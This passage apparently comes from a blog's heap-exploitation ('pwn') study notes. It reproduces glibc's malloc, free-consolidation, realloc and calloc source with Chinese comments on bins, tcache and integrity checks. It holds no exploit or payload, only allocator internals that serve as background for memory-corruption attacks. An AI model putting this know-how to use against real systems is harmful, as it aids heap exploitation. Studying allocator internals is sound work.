p); nextp = REVEAL_PTR(p-\u0026gt;fd); // 下一個fastbin /* Slightly streamlined version of consolidation code in free() */ size = chunksize(p); nextchunk = chunk_at_offset(p, size); nextsize = chunksize(nextchunk); 向前(低位)合併 #\rif (!prev_inuse(p)) // 向前(低位)合併 { prevsize = prev_size(p); size += prevsize; p = chunk_at_offset(p, -((long)prevsize)); if (__glibc_unlikely(chunksize(p) != prevsize)) malloc_printerr(\u0026#34;corrupted size vs. prev_size in fastbins\u0026#34;); unlink_chunk(av, p); } 向後合併 #\rif (nextchunk != av-\u0026gt;top) { nextinuse = inuse_bit_at_offset(nextchunk, nextsize); if (!nextinuse) // 如果下一個chunk是freed，向前合併 { size += nextsize; unlink_chunk(av, nextchunk); } 丟進unsorted bin #\relse clear_inuse_bit_at_offset(nextchunk, 0); // 丟進unsortedbin first_unsorted = unsorted_bin-\u0026gt;fd; unsorted_bin-\u0026gt;fd = p; first_unsorted-\u0026gt;bk = p; if (!in_smallbin_range(size)) { p-\u0026gt;fd_nextsize = NULL; p-\u0026gt;bk_nextsize = NULL; } set_head(p, size | PREV_INUSE); p-\u0026gt;bk = unsorted_bin; p-\u0026gt;fd = first_unsorted; set_foot(p, size); } 向top chunk合併 #\relse // 向top chunk合併 { size += nextsize; set_head(p, size | PREV_INUSE); av-\u0026gt;top = p; } 結束迴圈 #\r} while ((p = nextp) != 0); } } while (fb++ != maxfb); Reference #\rhttps://www.kn0sky.com/?p=e81d8a0c-22b2-4263-910f-955664c3995c ","date":"2025-02-23","externalUrl":null,"permalink":"/notes/pwn/heap/6-free/","section":"Notes","summary":"__libc_free() #\r其實就是free() __libc_free(void *mem) { mstate ar_ptr; mchunkptr p; /* chunk corresponding to mem */ if (mem == 0) /* free(0) has no effect */ return; /* Quickly check that the freed pointer matches the tag for the memory.","title":"Free","type":"notes"},{"content":"\r__libc_malloc() #\r__libc_malloc為呼叫malloc實際執行的function victim 是作為回傳的記憶體 __libc_malloc(size_t bytes) { mstate ar_ptr; void *victim; _Static_assert(PTRDIFF_MAX \u0026lt;= SIZE_MAX / 2, \u0026#34;PTRDIFF_MAX is not more than half of SIZE_MAX\u0026#34;); if (!__malloc_initialized) // 檢查heap是否被初始化 ptmalloc_init(); // 執行malloc 初始化 嘗試從tcache分配記憶體 #\r#if USE_TCACHE /* int_free also calls request2size, be careful to not pad twice. */ size_t tbytes; if (!checked_request2size(bytes, \u0026amp;tbytes)) // 確保分配大小正常 { __set_errno(ENOMEM); return NULL; } size_t tc_idx = csize2tidx(tbytes); MAYBE_INIT_TCACHE(); DIAG_PUSH_NEEDS_COMMENT; if (tc_idx \u0026lt; mp_.tcache_bins \u0026amp;\u0026amp; tcache \u0026amp;\u0026amp; tcache-\u0026gt;counts[tc_idx] \u0026gt; 0) // 如果tcache有東西 { victim = tcache_get(tc_idx); return tag_new_usable(victim); } DIAG_POP_NEEDS_COMMENT; #endif 在單執行緒的情況下 #\r呼叫了_int_malloc()，也是主要在實作malloc的函數 if (SINGLE_THREAD_P) { victim = tag_new_usable(_int_malloc(\u0026amp;main_arena, bytes)); assert(!victim || chunk_is_mmapped(mem2chunk(victim)) || \u0026amp;main_arena == arena_for_chunk(mem2chunk(victim))); return victim; } 在多執行緒的情況下 #\rarena_get(ar_ptr, bytes); // 獲取arena victim = _int_malloc(ar_ptr, bytes); /* Retry with another arena only if we were able to find a usable arena before. */ if (!victim \u0026amp;\u0026amp; ar_ptr != NULL) // 如果分配失敗 { LIBC_PROBE(memory_malloc_retry, 1, bytes); ar_ptr = arena_get_retry(ar_ptr, bytes); // 使用其他arena victim = _int_malloc(ar_ptr, bytes); } if (ar_ptr != NULL) __libc_lock_unlock(ar_ptr-\u0026gt;mutex); // 在多thread的情況下會上鎖arena，這裡解鎖表示arena使用結束 victim = tag_new_usable(victim); assert(!victim || chunk_is_mmapped(mem2chunk(victim)) || ar_ptr == arena_for_chunk(mem2chunk(victim))); // 檢查 victim不為空 | victim是透過mmap分配 | victim是來自正確的arena， return victim; _int_malloc() #\r變數功能註解都有寫了，真好owob\n_int_malloc (mstate av, size_t bytes) { INTERNAL_SIZE_T nb; /* normalized request size */ unsigned int idx; /* associated bin index */ mbinptr bin; /* associated bin */ mchunkptr victim; /* inspected/selected chunk */ INTERNAL_SIZE_T size; /* its size */ int victim_index; /* its bin index */ mchunkptr remainder; /* remainder from a split */ unsigned long remainder_size; /* its size */ unsigned int block; /* bit map traverser */ unsigned int bit; /* bit map traverser */ unsigned int map; /* current word of binmap */ mchunkptr fwd; /* misc temp for linking */ mchunkptr bck; /* misc temp for linking */ #if USE_TCACHE size_t tcache_unsorted_count;\t/* count of unsorted chunks processed */ #endif fastbin #\rif ((unsigned long)(nb) \u0026lt;= (unsigned long)(get_max_fast())) { // 得到對應fastbin索引 idx = fastbin_index(nb); // 得到對應索引fastbin的pointer mfastbinptr *fb = \u0026amp;fastbin(av, idx); mchunkptr pp; victim = *fb; // victim 是malloc_chunk的結構 // 如果對應index的fastbin存在 if (victim != NULL) { // fastbin top address對齊檢查 if (__glibc_unlikely(misaligned_chunk(victim))) malloc_printerr(\u0026#34;malloc(): unaligned fastbin chunk detected 2\u0026#34;); // unlink if (SINGLE_THREAD_P) *fb = REVEAL_PTR(victim-\u0026gt;fd); else REMOVE_FB(fb, pp, victim); // if (__glibc_likely(victim != NULL)) { size_t victim_idx = fastbin_index(chunksize(victim)); if (__builtin_expect(victim_idx != idx, 0)) malloc_printerr(\u0026#34;malloc(): memory corruption (fast)\u0026#34;); check_remalloced_chunk(av, victim, nb); tcache #\r#if USE_TCACHE /* While we\u0026#39;re here, if we see other chunks of the same size, stash them in the tcache. */ // 計算tcache index size_t tc_idx = csize2tidx(nb); // 如果tcache滿足要求 if (tcache \u0026amp;\u0026amp; tc_idx \u0026lt; mp_.tcache_bins) { mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks. */ // 如果fastbin有東西然後tcache沒滿，把chunks裝到tcache while (tcache-\u0026gt;counts[tc_idx] \u0026lt; mp_.tcache_count \u0026amp;\u0026amp; (tc_victim = *fb) != NULL) { if (__glibc_unlikely(misaligned_chunk(tc_victim))) malloc_printerr(\u0026#34;malloc(): unaligned fastbin chunk detected 3\u0026#34;); if (SINGLE_THREAD_P) *fb = REVEAL_PTR(tc_victim-\u0026gt;fd); else { // 斷鍊操作 REMOVE_FB(fb, pp, tc_victim); if (__glibc_unlikely(tc_victim == NULL)) break; } tcache_put(tc_victim, tc_idx); } } #endif 回傳記憶體 #\r// 返回mem地址 void *p = chunk2mem(victim); // 加上0x10的header size alloc_perturb(p, bytes); return p; } } } smallbin #\rif (in_smallbin_range(nb)) { // 計算對應大小的索引值 idx = smallbin_index(nb); // 獲取smallbin指標 bin = bin_at(av, idx); if ((victim = last(bin)) != bin) { bck = victim-\u0026gt;bk; // 檢查double linked list結構的完整性 if (__glibc_unlikely(bck-\u0026gt;fd != victim)) malloc_printerr(\u0026#34;malloc(): smallbin double linked list corrupted\u0026#34;); // 將chunk從尾端取出 set_inuse_bit_at_offset(victim, nb); bin-\u0026gt;bk = bck; bck-\u0026gt;fd = bin; // 檢查是否為在main arena if (av != \u0026amp;main_arena) set_non_main_arena(victim); // 檢查chunk是否正常 check_malloced_chunk(av, victim, nb); tcache #\r#if USE_TCACHE /* While we\u0026#39;re here, if we see other chunks of the same size, stash them in the tcache. */ // 計算tcache index size_t tc_idx = csize2tidx(nb); // 如果tcache滿足要求 if (tcache \u0026amp;\u0026amp; tc_idx \u0026lt; mp_.tcache_bins) { mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks over. */ // 如果fastbin有東西然後tcache沒滿，把chunks裝到tcache while (tcache-\u0026gt;counts[tc_idx] \u0026lt; mp_.tcache_count \u0026amp;\u0026amp; (tc_victim = last(bin)) != bin) { if (tc_victim != 0) { bck = tc_victim-\u0026gt;bk; set_inuse_bit_at_offset(tc_victim, nb); if (av != \u0026amp;main_arena) set_non_main_arena(tc_victim); // 斷鏈操作，並把chunk放到tcache bin-\u0026gt;bk = bck; bck-\u0026gt;fd = bin; tcache_put(tc_victim, tc_idx); } } } #endif 回傳記憶體 #\r// 返回mem地址 void *p = chunk2mem(victim); // 加上0x10的header size alloc_perturb(p, bytes); return p; } } 合併fastbin #\r下面這段code的用意是為了在進行檢查儲存大chunk的bin(unsortedbin, largebin)之前先清除fastbin\n因為fastbin不會主動合併，亦阻止了相鄰的chunk合併，使整個記憶體碎片化\nelse { idx = largebin_index (nb); if (atomic_load_relaxed (\u0026amp;av-\u0026gt;have_fastchunks)) malloc_consolidate (av); } unsortedbin #\r拿到這個chunk和下個chunk的pointer 檢查chunk的結構有沒有被破壞 檢查 #\rfor (;;) //這個for迴圈同時包含了unsortedbin和largebin的實作，因為他們兩個息息相關 { int iters = 0; while ((victim = unsorted_chunks(av)-\u0026gt;bk) != unsorted_chunks(av)) { bck = victim-\u0026gt;bk; // 取出 unsortedbin 倒數第二個 freed chunk (victim被為被取下來的那塊) size = chunksize(victim); mchunkptr next = chunk_at_offset(victim, size); // 根據chunksize找到下一個chunk的位置 if (__glibc_unlikely(size \u0026lt;= CHUNK_HDR_SZ) || __glibc_unlikely(size \u0026gt; av-\u0026gt;system_mem)) // chunk大小小於header大小或比heap空間大 malloc_printerr(\u0026#34;malloc(): invalid size (unsorted)\u0026#34;); if (__glibc_unlikely(chunksize_nomask(next) \u0026lt; CHUNK_HDR_SZ) || __glibc_unlikely(chunksize_nomask(next) \u0026gt; av-\u0026gt;system_mem)) // 檢查下一個chunk的大小是否正常 malloc_printerr(\u0026#34;malloc(): invalid next size (unsorted)\u0026#34;); if (__glibc_unlikely((prev_size(next) \u0026amp; ~(SIZE_BITS)) != size)) // 檢查prev_size 是否等於當前 size malloc_printerr(\u0026#34;malloc(): mismatching next-\u0026gt;prev_size (unsorted)\u0026#34;); if (__glibc_unlikely(bck-\u0026gt;fd != victim) || __glibc_unlikely(victim-\u0026gt;fd != unsorted_chunks(av))) // 檢查doubly linked list的完整性 malloc_printerr(\u0026#34;malloc(): unsorted double linked list corrupted\u0026#34;); if (__glibc_unlikely(prev_inuse(next))) // 檢查prev_inuse bit (unsortedbin 應該 unset prev_inuse bit) malloc_printerr(\u0026#34;malloc(): invalid next-\u0026gt;prev_inuse (unsorted)\u0026#34;); 使用last remainder #\r滿足以下需求\n如果是small request(小於smallbin max request size，非largebin size) 且last remainder(切割剩下的chunk)是unsortedbin裡面唯一一塊chunk的話 註: last remainder 一定會位於unsortedbin，因為切割過後的chunk會先放回unsortedbin\n/* If a small request, try to use last remainder if it is the only chunk in unsorted bin. This helps promote locality for runs of consecutive small requests. This is the only exception to best-fit, and applies only when there is no exact fit for a small chunk. */ if (in_smallbin_range(nb) \u0026amp;\u0026amp; bck == unsorted_chunks(av) \u0026amp;\u0026amp; victim == av-\u0026gt;last_remainder \u0026amp;\u0026amp; (unsigned long)(size) \u0026gt; (unsigned long)(nb + MINSIZE)) { /* split and reattach remainder */ remainder_size = size - nb; // 計算remainder chunk被切下來的剩下大小 remainder = chunk_at_offset(victim, nb); // 偏移後得到新的remainder chunk unsorted_chunks(av)-\u0026gt;bk = unsorted_chunks(av)-\u0026gt;fd = remainder; // 調整unsortedbin起始點(因為remainder已經被切割) av-\u0026gt;last_remainder = remainder; // 紀錄last remainder到main arena remainder-\u0026gt;bk = remainder-\u0026gt;fd = unsorted_chunks(av); // 調整remainder的fd和bk if (!in_smallbin_range(remainder_size)) // 如果remainder的size小於smallbin max request size的話 { remainder-\u0026gt;fd_nextsize = NULL; // 清空(fd_nextsize)，這邊有可能是因為從largebin切割完丟回來的 remainder-\u0026gt;bk_nextsize = NULL; } set_head(victim, nb | PREV_INUSE | (av != \u0026amp;main_arena ? NON_MAIN_ARENA : 0)); //設定取下的chunk的 chunksize, prev_inuse bit, non_main_arena set_head(remainder, remainder_size | PREV_INUSE); // 設定remainder的prev_inuse bit 和isze set_foot(remainder, remainder_size); //設定remainder 下一個chunk的prev_size check_malloced_chunk(av, victim, nb); void *p = chunk2mem(victim); alloc_perturb(p, bytes); return p; } unlink #\r/* remove from unsorted list */ if (__glibc_unlikely(bck-\u0026gt;fd != victim)) malloc_printerr(\u0026#34;malloc(): corrupted unsorted chunks 3\u0026#34;); unsorted_chunks(av)-\u0026gt;bk = bck; bck-\u0026gt;fd = unsorted_chunks(av); 如果fit size #\r如果fit size的話就直接回傳那塊 /* Take now instead of binning if exact fit */ if (size == nb) { set_inuse_bit_at_offset(victim, size); if (av != \u0026amp;main_arena) set_non_main_arena(victim); #if USE_TCACHE /* Fill cache first, return to user only if cache fills. We may return one of these chunks later. */ if (tcache_nb \u0026amp;\u0026amp; tcache-\u0026gt;counts[tc_idx] \u0026lt; mp_.tcache_count) { tcache_put(victim, tc_idx); return_cached = 1; continue; } else { #endif check_malloced_chunk(av, victim, nb); void *p = chunk2mem(victim); alloc_perturb(p, bytes); return p; #if USE_TCACHE } #endif } 放回smallbin的情況 #\r(如果是smallbin range的話)\nif (in_smallbin_range(size)) { victim_index = smallbin_index(size); bck = bin_at(av, victim_index); fwd = bck-\u0026gt;fd; } 放回largebin的情況 #\relse { victim_index = largebin_index(size); // 找到對應size的bin index bck = bin_at(av, victim_index); // 使用index找到bin的起始點 fwd = bck-\u0026gt;fd; /* maintain large bins in sorted order */ if (fwd != bck) // 如果bin鍊有東西 { /* Or with inuse bit to speed comparisons */ size |= PREV_INUSE; /* if smaller than smallest, bypass loop below */ assert(chunk_main_arena(bck-\u0026gt;bk)); if ((unsigned long)(size) \u0026lt; (unsigned long)chunksize_nomask(bck-\u0026gt;bk)) { // 如果size為比最後一塊(同時也是最小塊)還小，就直接插入尾端 fwd = bck; bck = bck-\u0026gt;bk; victim-\u0026gt;fd_nextsize = fwd-\u0026gt;fd; victim-\u0026gt;bk_nextsize = fwd-\u0026gt;fd-\u0026gt;bk_nextsize; fwd-\u0026gt;fd-\u0026gt;bk_nextsize = victim-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = victim; } else { assert(chunk_main_arena(fwd)); //從鍊頭開始往下遍歷 while ((unsigned long)size \u0026lt; chunksize_nomask(fwd)) { // 找到跳過比他大的chunk fwd = fwd-\u0026gt;fd_nextsize; assert(chunk_main_arena(fwd)); } // 檢查這個chunk的size是否跟他一致 if ((unsigned long)size == (unsigned long)chunksize_nomask(fwd)) /* Always insert in the second position. */ fwd = fwd-\u0026gt;fd; else { // 如果沒有跟他一樣的話就新增一個size進入linked list victim-\u0026gt;fd_nextsize = fwd; victim-\u0026gt;bk_nextsize = fwd-\u0026gt;bk_nextsize; if (__glibc_unlikely(fwd-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize != fwd)) malloc_printerr(\u0026#34;malloc(): largebin double linked list corrupted (nextsize)\u0026#34;); fwd-\u0026gt;bk_nextsize = victim; victim-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = victim; } bck = fwd-\u0026gt;bk; if (bck-\u0026gt;fd != fwd) malloc_printerr(\u0026#34;malloc(): largebin double linked list corrupted (bk)\u0026#34;); } } else victim-\u0026gt;fd_nextsize = victim-\u0026gt;bk_nextsize = victim; //如果largebin沒東西的話那就需要構造一下了 } 放回bin中(剛剛那兩段只是為了找到bck和fwd) #\r// 放到對應bin中 mark_bin(av, victim_index); victim-\u0026gt;bk = bck; victim-\u0026gt;fd = fwd; fwd-\u0026gt;bk = victim; bck-\u0026gt;fd = victim; 結束while迴圈 #\r如果unsorted放太多chunk到tcache的話就直接回傳(前提是大小有對應 但預設mp_.tcache_unsorted_limit = 0，所以也不會執行這段 #if USE_TCACHE /* If we\u0026#39;ve processed as many chunks as we\u0026#39;re allowed while filling the cache, return one of the cached ones. */ // ++tcache_unsorted_count; if (return_cached \u0026amp;\u0026amp; mp_.tcache_unsorted_limit \u0026gt; 0 \u0026amp;\u0026amp; tcache_unsorted_count \u0026gt; mp_.tcache_unsorted_limit) { return tcache_get(tc_idx); } #endif 超過最大iteration限制就直接break #define MAX_ITERS 10000 if (++iters \u0026gt;= MAX_ITERS) break; } unsortedbin binning code跑完之後，再檢查tcache一遍 #if USE_TCACHE /* If all the small chunks we found ended up cached, return one now. */ if (return_cached) { return tcache_get(tc_idx); } largebin #\r/* If a large request, scan through the chunks of current bin in sorted order to find smallest that fits. Use the skip list for this. */ if (!in_smallbin_range(nb)) { bin = bin_at(av, idx); /* skip scan if empty or largest chunk is too small */ // 遍歷特定大小，跳過那些比請求小或者是空的 if ((victim = first(bin)) != bin \u0026amp;\u0026amp; (unsigned long)chunksize_nomask(victim) \u0026gt;= (unsigned long)(nb)) { victim = victim-\u0026gt;bk_nextsize; while (((unsigned long)(size = chunksize(victim)) \u0026lt; (unsigned long)(nb))) victim = victim-\u0026gt;bk_nextsize; /* Avoid removing the first entry for a size so that the skip list does not have to be rerouted. */ // 如果拿到的chunk不是該bin的最後一塊，我們選擇其前面那塊，這樣可以避免調整fd_nextsize和bk_nextsize // 因為fd_nextsize和bk_nextsize都是指向某個大小的第一塊 if (victim != last(bin) \u0026amp;\u0026amp; chunksize_nomask(victim) == chunksize_nomask(victim-\u0026gt;fd)) victim = victim-\u0026gt;fd; remainder_size = size - nb; unlink_chunk(av, victim); 切割後的size不足成為一個chunk #\r/* Exhaust */ // 切割後的size不能做為一個chunk if (remainder_size \u0026lt; MINSIZE) { set_inuse_bit_at_offset(victim, size); if (av != \u0026amp;main_arena) set_non_main_arena(victim); } 切割chunk #\r/* Split */ else { remainder = chunk_at_offset(victim, nb); /* We cannot assume the unsorted list is empty and therefore have to perform a complete insert here. */ bck = unsorted_chunks(av); fwd = bck-\u0026gt;fd; if (__glibc_unlikely(fwd-\u0026gt;bk != bck)) malloc_printerr(\u0026#34;malloc(): corrupted unsorted chunks\u0026#34;); // unlink操作 remainder-\u0026gt;bk = bck; remainder-\u0026gt;fd = fwd; bck-\u0026gt;fd = remainder; fwd-\u0026gt;bk = remainder; // 清空fd_nextsize \u0026amp; bk_nextsize if (!in_smallbin_range(remainder_size)) { remainder-\u0026gt;fd_nextsize = NULL; remainder-\u0026gt;bk_nextsize = NULL; } set_head(victim, nb | PREV_INUSE | (av != \u0026amp;main_arena ? NON_MAIN_ARENA : 0)); //重新分配chunk的標記 set_head(remainder, remainder_size | PREV_INUSE); // 設置 remainder的prev_size set_foot(remainder, remainder_size); // 設置 remainder下一個chunk的prev_size } 回傳記憶體 #\rcheck_malloced_chunk(av, victim, nb); // 轉為mem型態 void *p = chunk2mem(victim); alloc_perturb(p, bytes); return p; } } search for larger bin #\r如果走到這邊，代表相同size的bin都不能滿足\n會找更大的chunk\n/* Search for a chunk by scanning bins, starting with next largest bin. This search is strictly by best-fit; i.e., the smallest (with ties going to approximately the least recently used) chunk that fits is selected. The bitmap avoids needing to check that most blocks are nonempty. The particular case of skipping all bins during warm-up phases when no chunks have been returned yet is faster than it might look. */ // 如果在這之前的方式都沒找到合適的bin的話 // 掃描所有bin // binmap: binmap會以bit為單位來紀錄bin鏈是否有東西 // 會有四組32 bit大小的整數，總共128 bit ++idx; // 下一個bin的索引值 bin = bin_at (av, idx); // 下一個bin的指標位置 block = idx2block (idx); // 將idx轉成block，block一共四個，大小128，idx 0-31 為0，idx 32-63 為1，以此類推 map = av-\u0026gt;binmap[block]; // 獲取map bit = idx2bit (idx); // 將idx轉回bit 找到合適的bin #\rfor (;;) { /* Skip rest of block if there are no more set bits in this block. */ // 跳過空的bin鏈 if (bit \u0026gt; map || bit == 0) { do { if (++block \u0026gt;= BINMAPSIZE) /* out of bins */ goto use_top; // 如果所有block都被搜過了，然後沒東西就跳轉到use_top(使用top chunk分配) } while ((map = av-\u0026gt;binmap[block]) == 0); bin = bin_at(av, (block \u0026lt;\u0026lt; BINMAPSHIFT)); bit = 1; } /* Advance to bin with set bit. There must be one. */ while ((bit \u0026amp; map) == 0) // 找到block中有東西的bin鏈 { bin = next_bin(bin); bit \u0026lt;\u0026lt;= 1; assert(bit != 0); } /* Inspect the bin. It is likely to be non-empty */ // 獲取最後的chunk victim = last(bin); /* If a false alarm (empty bin), clear the bit. */ // 如果bin-\u0026gt;bk == bin的話代表bin鏈為空 // 要清除bit，並繼續循環 if (victim == bin) // { av-\u0026gt;binmap[block] = map \u0026amp;= ~bit; /* Write through */ bin = next_bin(bin); bit \u0026lt;\u0026lt;= 1; } 找到 #\relse { size = chunksize(victim); /* We know the first chunk in this bin is big enough to use. */ assert((unsigned long)(size) \u0026gt;= (unsigned long)(nb)); remainder_size = size - nb; /* unlink */ unlink_chunk(av, victim); /* Exhaust */ // 切割剩下的size不足成為一個chunk if (remainder_size \u0026lt; MINSIZE) { set_inuse_bit_at_offset(victim, size); if (av != \u0026amp;main_arena) set_non_main_arena(victim); } 切割後的size不足成為一個chunk #\r/* Split */ // 這邊都跟之前差不多 else { remainder = chunk_at_offset(victim, nb); /* We cannot assume the unsorted list is empty and therefore have to perform a complete insert here. */ bck = unsorted_chunks(av); fwd = bck-\u0026gt;fd; if (__glibc_unlikely(fwd-\u0026gt;bk != bck)) malloc_printerr(\u0026#34;malloc(): corrupted unsorted chunks 2\u0026#34;); remainder-\u0026gt;bk = bck; remainder-\u0026gt;fd = fwd; bck-\u0026gt;fd = remainder; fwd-\u0026gt;bk = remainder; /* advertise as last remainder */ if (in_smallbin_range(nb)) av-\u0026gt;last_remainder = remainder; if (!in_smallbin_range(remainder_size)) { remainder-\u0026gt;fd_nextsize = NULL; remainder-\u0026gt;bk_nextsize = NULL; } set_head(victim, nb | PREV_INUSE | (av != \u0026amp;main_arena ? NON_MAIN_ARENA : 0)); set_head(remainder, remainder_size | PREV_INUSE); set_foot(remainder, remainder_size); } 回傳記憶體 #\rcheck_malloced_chunk(av, victim, nb); void *p = chunk2mem(victim); alloc_perturb(p, bytes); return p; } } use top #\r最後的情況會嘗試從 top chunk切割chunk下來\nuse_top : /* If large enough, split off the chunk bordering the end of memory (held in av-\u0026gt;top). Note that this is in accord with the best-fit search rule. In effect, av-\u0026gt;top is treated as larger (and thus less well fitting) than any other available chunk since it can be extended to be as large as necessary (up to system limitations). We require that av-\u0026gt;top always exists (i.e., has size \u0026gt;= MINSIZE) after initialization, so if it would otherwise be exhausted by current request, it is replenished. (The main reason for ensuring it exists is that we may need MINSIZE space to put in fenceposts in sysmalloc.) */ victim = av-\u0026gt;top; // top_chunk size = chunksize(victim); if (__glibc_unlikely(size \u0026gt; av-\u0026gt;system_mem)) // chunk size大於heap空間 malloc_printerr(\u0026#34;malloc(): corrupted top size\u0026#34;); 如果top chunk有足夠的大小可以被切割 #\rif ((unsigned long)(size) \u0026gt;= (unsigned long)(nb + MINSIZE)) { remainder_size = size - nb; remainder = chunk_at_offset(victim, nb); av-\u0026gt;top = remainder; set_head(victim, nb | PREV_INUSE | (av != \u0026amp;main_arena ? NON_MAIN_ARENA : 0)); set_head(remainder, remainder_size | PREV_INUSE); check_malloced_chunk(av, victim, nb); void *p = chunk2mem(victim); alloc_perturb(p, bytes); return p; } 如果沒有，檢查是否有fastbin #\rfastbin不會自動合併，但malloc_consolidate()會把相鄰的fastbin合併\nelse if (atomic_load_relaxed(\u0026amp;av-\u0026gt;have_fastchunks)) { malloc_consolidate(av); /* restore original bin index */ if (in_smallbin_range(nb)) idx = smallbin_index(nb); //取出對映smallbin size的idx，會在下一個iteration被處理 else idx = largebin_index(nb); //取出對映largebin size的idx，會在下一個iteration被處理 } 最終情況，會用sysmalloc再要一塊記憶體 #\r/* Otherwise, relay to handle system-dependent cases */ else { void *p = sysmalloc(nb, av); //跟系統要一塊記憶體 if (p != NULL) alloc_perturb(p, bytes); return p; } } } __libc_realloc #\r擴展當前記憶體 __libc_realloc(void *oldmem, size_t bytes) { mstate ar_ptr; INTERNAL_SIZE_T nb; /* padded request size */ void *newp; /* chunk to return */ if (!__malloc_initialized) // 初始化(如果沒有) ptmalloc_init(); #if REALLOC_ZERO_BYTES_FREES if (bytes == 0 \u0026amp;\u0026amp; oldmem != NULL) { __libc_free(oldmem); return 0; } #endif /* realloc of null is supposed to be same as malloc */ if (oldmem == 0) // 舊指標為空，可以使用malloc就好了 return __libc_malloc(bytes); /* Perform a quick check to ensure that the pointer\u0026#39;s tag matches the memory\u0026#39;s tag. */ // 確保pointer的tag和memory的tag相符 if (__glibc_unlikely(mtag_enabled)) *(volatile char *)oldmem; /* chunk corresponding to oldmem */ const mchunkptr oldp = mem2chunk(oldmem); /* its size */ const INTERNAL_SIZE_T oldsize = chunksize(oldp); //取得舊的size if (chunk_is_mmapped(oldp)) ar_ptr = NULL; else { MAYBE_INIT_TCACHE(); ar_ptr = arena_for_chunk(oldp); } /* Little security check which won\u0026#39;t hurt performance: the allocator never wrapps around at the end of the address space. Therefore we can exclude some size values which might appear here by accident or by \u0026#34;design\u0026#34; from some intruder. */ if ((__builtin_expect((uintptr_t)oldp \u0026gt; (uintptr_t)-oldsize, 0) || __builtin_expect(misaligned_chunk(oldp), 0))) // 確保舊指標沒越界 malloc_printerr(\u0026#34;realloc(): invalid pointer\u0026#34;); if (!checked_request2size(bytes, \u0026amp;nb)) { __set_errno(ENOMEM); return NULL; } if (chunk_is_mmapped(oldp)) // chunk是否是mmap出來的 { void *newmem; #if HAVE_MREMAP newp = mremap_chunk(oldp, nb); // 擴展記憶體或壓縮記憶體 if (newp) { void *newmem = chunk2mem_tag(newp); /* Give the new block a different tag. This helps to ensure that stale handles to the previous mapping are not reused. There\u0026#39;s a performance hit for both us and the caller for doing this, so we might want to reconsider. */ return tag_new_usable(newmem); } #endif /* Note the extra SIZE_SZ overhead. */ if (oldsize - SIZE_SZ \u0026gt;= nb) // realloc的大小比原本的小 return oldmem; /* do nothing */ /* Must alloc, copy, free. */ newmem = __libc_malloc(bytes); if (newmem == 0) return 0; /* propagate failure */ memcpy(newmem, oldmem, oldsize - CHUNK_HDR_SZ); munmap_chunk(oldp); return newmem; } if (SINGLE_THREAD_P) { newp = _int_realloc(ar_ptr, oldp, oldsize, nb); assert(!newp || chunk_is_mmapped(mem2chunk(newp)) || ar_ptr == arena_for_chunk(mem2chunk(newp))); return newp; } __libc_lock_lock(ar_ptr-\u0026gt;mutex); newp = _int_realloc(ar_ptr, oldp, oldsize, nb); __libc_lock_unlock(ar_ptr-\u0026gt;mutex); assert(!newp || chunk_is_mmapped(mem2chunk(newp)) || ar_ptr == arena_for_chunk(mem2chunk(newp))); if (newp == NULL) // 當記憶體分配失敗嘗試在其他arena分配 { /* Try harder to allocate memory in other arenas. */ LIBC_PROBE(memory_realloc_retry, 2, bytes, oldmem); newp = __libc_malloc(bytes); if (newp != NULL) { size_t sz = memsize(oldp); memcpy(newp, oldmem, sz); (void)tag_region(chunk2mem(oldp), sz); _int_free(ar_ptr, oldp, 0); } } return newp; } _int_realloc() #\r_int_realloc(mstate av, mchunkptr oldp, INTERNAL_SIZE_T oldsize, INTERNAL_SIZE_T nb) { mchunkptr newp; /* chunk to return */ INTERNAL_SIZE_T newsize; /* its size */ void *newmem; /* corresponding user mem */ mchunkptr next; /* next contiguous chunk after oldp */ mchunkptr remainder; /* extra space at end of newp */ unsigned long remainder_size; /* its size */ /* oldmem size */ if (__builtin_expect(chunksize_nomask(oldp) \u0026lt;= CHUNK_HDR_SZ, 0) || __builtin_expect(oldsize \u0026gt;= av-\u0026gt;system_mem, 0)) malloc_printerr(\u0026#34;realloc(): invalid old size\u0026#34;); check_inuse_chunk(av, oldp); /* All callers already filter out mmap\u0026#39;ed chunks. */ assert(!chunk_is_mmapped(oldp)); next = chunk_at_offset(oldp, oldsize); INTERNAL_SIZE_T nextsize = chunksize(next); if (__builtin_expect(chunksize_nomask(next) \u0026lt;= CHUNK_HDR_SZ, 0) || __builtin_expect(nextsize \u0026gt;= av-\u0026gt;system_mem, 0)) malloc_printerr(\u0026#34;realloc(): invalid next size\u0026#34;); 如果舊的夠大 #\rif ((unsigned long)(oldsize) \u0026gt;= (unsigned long)(nb)) { /* already big enough; split below */ newp = oldp; newsize = oldsize; } 嘗試向top chunk擴展 #\relse { /* Try to expand forward into top */ if (next == av-\u0026gt;top \u0026amp;\u0026amp; (unsigned long)(newsize = oldsize + nextsize) \u0026gt;= (unsigned long)(nb + MINSIZE)) { set_head_size(oldp, nb | (av != \u0026amp;main_arena ? NON_MAIN_ARENA : 0)); av-\u0026gt;top = chunk_at_offset(oldp, nb); set_head(av-\u0026gt;top, (newsize - nb) | PREV_INUSE); check_inuse_chunk(av, oldp); return tag_new_usable(chunk2mem(oldp)); } 向下方free chunk擴展 #\r// 向下擴展，並切割 else if (next != av-\u0026gt;top \u0026amp;\u0026amp; !inuse(next) \u0026amp;\u0026amp; (unsigned long)(newsize = oldsize + nextsize) \u0026gt;= (unsigned long)(nb)) { newp = oldp; unlink_chunk(av, next); } 否則重新分配記憶體 #\r/* allocate, copy, free */ // 分配新記憶體，複製資料過去，然後釋放舊的記憶體 else { newmem = _int_malloc(av, nb - MALLOC_ALIGN_MASK); if (newmem == 0) return 0; /* propagate failure */ newp = mem2chunk(newmem); newsize = chunksize(newp); /* Avoid copy if newp is next chunk after oldp. */ if (newp == next) { newsize += oldsize; newp = oldp; } else { void *oldmem = chunk2mem(oldp); size_t sz = memsize(oldp); (void)tag_region(oldmem, sz); newmem = tag_new_usable(newmem); memcpy(newmem, oldmem, sz); _int_free(av, oldp, 1); check_inuse_chunk(av, newp); return newmem; } } __libc_calloc() #\r作用是會malloc一塊全部為0的記憶體 然後可以看到並不會從tcache取出chunk void *__libc_calloc(size_t n, size_t elem_size) { mstate av; mchunkptr oldtop; INTERNAL_SIZE_T sz, oldtopsize; void *mem; unsigned long clearsize; unsigned long nclears; INTERNAL_SIZE_T *d; ptrdiff_t bytes; if (__glibc_unlikely(__builtin_mul_overflow(n, 